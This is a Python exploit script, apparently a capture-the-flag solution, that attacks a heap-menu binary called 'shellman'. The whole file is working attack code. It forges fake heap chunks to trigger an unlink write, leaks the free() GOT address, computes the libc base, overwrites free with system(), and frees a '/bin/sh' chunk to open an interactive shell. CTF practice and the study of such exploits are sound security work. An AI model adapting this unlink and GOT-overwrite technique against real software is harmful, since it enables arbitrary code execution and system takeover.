from zio import *

c_read  = COLORED(RAW, 'blue')
c_write = COLORED(RAW, 'green')
target  = './shellman.b400c663a0ca53f1f6c6fcbf60defa8d'
io      = zio(target, print_read = c_read, print_write = c_write, timeout = 100000)
#io.gdb_hint([0x4007b0])    # new
#io.gdb_hint([0x400790])     # delete
#io.gdb_hint([0x4007a0])     # edit
io.gdb_hint([0x4007a7])     # edit finish
#io.gdb_hint([0x4007c0])     # list

def list_shellcode():
    io.read_until('> ')
    io.writeline('1')
    io.read_until('SHELLC0DE 0: ')

def new_shellcode(shellcode):
    io.read_until('> ')
    io.writeline('2')
    io.read_until('Length of new shellcode: ')
    io.writeline(str(len(shellcode)))
    io.read_until('Enter your shellcode(in raw format): ')
    io.writeline(shellcode)

def edit_shellcode(index, shellcode):
    io.read_until('> ')
    io.writeline('3')
    io.read_until('Shellcode number: ')
    io.writeline(str(index))
    io.read_until('Length of shellcode: ')
    io.writeline(str(len(shellcode)))
    io.read_until('Enter your shellcode: ')
    io.writeline(shellcode)

def del_shellcode(index):
    io.read_until('> ')
    io.writeline('4')
    io.read_until('Shellcode number: ')
    io.writeline(str(index))

new_shellcode('A' * 0x90)
new_shellcode('B' * 0x90)

adr_shellcode0  = 0x6016d0

fake0   =   l64(0x30)
fake0   +=  l64(0x91)
fake0   +=  l64(adr_shellcode0 - 0x8 * 3)
fake0   +=  l64(adr_shellcode0 - 0x8 * 2)
fake0   =   fake0.ljust(0x90, 'A')
fake1   =   l64(0x90)
fake1   +=  l64(0xa0)
payload = fake0 + fake1

edit_shellcode(0, payload)
del_shellcode(1)

got_free    = 0x601600
edit_shellcode(0, 'A' * 0x8 + l64(0x1) + l64(0x8) + l64(got_free))
list_shellcode()

adr_free        = l64(io.read(0x10).decode('hex'))
offset_free     = 0x82df0
libc_base       = adr_free - offset_free
offset_system   = 0x46640
adr_system      = libc_base + offset_system

edit_shellcode(0, l64(adr_system))

new_shellcode('/bin/sh\x00')
del_shellcode(1)
    
io.interact()
